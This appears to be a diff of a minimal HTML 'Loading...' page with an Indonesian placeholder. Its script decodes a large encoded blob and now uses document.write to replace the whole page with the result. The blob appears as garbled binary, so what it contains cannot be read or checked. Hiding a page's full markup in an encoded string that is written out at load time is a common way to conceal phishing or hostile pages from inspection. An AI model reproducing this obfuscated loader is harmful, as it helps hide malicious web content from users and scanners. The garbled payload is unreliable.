@@ -1,26 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-    <style>
-        body {
-            background:#000;
-            color:#fff;
-            font-family: sans-serif;
-            text-align:center;
-            padding-top:50px;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Loading...</title>
+<style>
+    body {
+        background:#000;
+        color:#fff;
+        font-family: sans-serif;
+        text-align:center;
+        padding-top:40px;
+    }
+</style>
 </head>
 <body>
 
-<div id="app">Loading content...</div>
+Memuat konten...
 
 <script>
-    //b64
-    const tsnoc = `
-    `!iaiejx"vvgiZǭQ1~gjvz+''mׯǾ'm)&t+ey7z
+
+const encoded = `
+`!iaiejx"vvgiZǭQ1~gjvz+''mׯǾ'm)&t+ey7z
 ژޚ+ڑHuح-Wڕ+rjבzǭnr~\׫i^bCq,酢{Rz
 Phnhoz؜h
 j[Ϭzm$.ߜZ+ѭѯj֫mZ౩jrh}j"JZuا)m)ź1ȳx^'z-jf'"{Zw~'m]ҜpaM&j"Fi׫￦x>z^ߚ('qz-Ҝi'"y^_{~,ޙ'mMZ+}}Mt)'"y^߬7ַrhiw蠆ykr)
@@ -38,8 +38,9 @@ uدrVr)ƫuϜj]%j)P
 �݊w"pޚ+݊%j)'F|M,ܕ,ۖ쥩v+rV))ߠ8jF|M,zؚjW%jyn>+-+)jw%j"rZJexXܕ,'ZzjpyhiОO*+֬XZZȜ쥩Z%uOyt(Zֿ)brV'()j~4b+)brV'()jr$jzK�ڷb+)jw%j"r-jv颺djwZbZrVZϊX=jv݊bZkȧkbZhZv8݊bZejj,4P9دsI,[دrVqiۍ4K)jw%j)zw쥩v+rV))ߠwj+Z(Qn4M,zؚ\,}歺XXܕ,'Z⢸jju'jtXZZȜ쥩ã	塧Ky	Zv)ZXܕ,'ZȓjDޭj&8hI,[Xܕ,'Z'bjȜMjˤXZZȜ쥩zw&jZv)/Xܕ,'Z(Z:ڞZ*':&jجXVܕ,r־nmpڥdjs'jZZƫ?݊bZkȧkzhbZejjD+bjju%)دrVqi߭4K)jw%j)zwZدZX~ޙx8jFM4bjZ\,}歺XXܕ,'Zj֧&i7m(}Xܕ,'ZؤbiI,[Xܕ,'Z⢸(Zا@jXܕ,'Z]4DG+)brV'()jp&Hrxjם>W)brV'()jp$�dxX^$In'/ky%jhڑSjjدد~-z%j^(*\nSzW颺bǩ
 u%jxzkXvjx>wZڮjV 4~-z݊ۡܿ٥`;
 
-    // decode Base64 → tampilkan
-    document.getElementById("app").innerHTML = atob(tsnoc);
+document.open();
+document.write(atob(encoded));
+document.close();
 </script>
 
 </body>
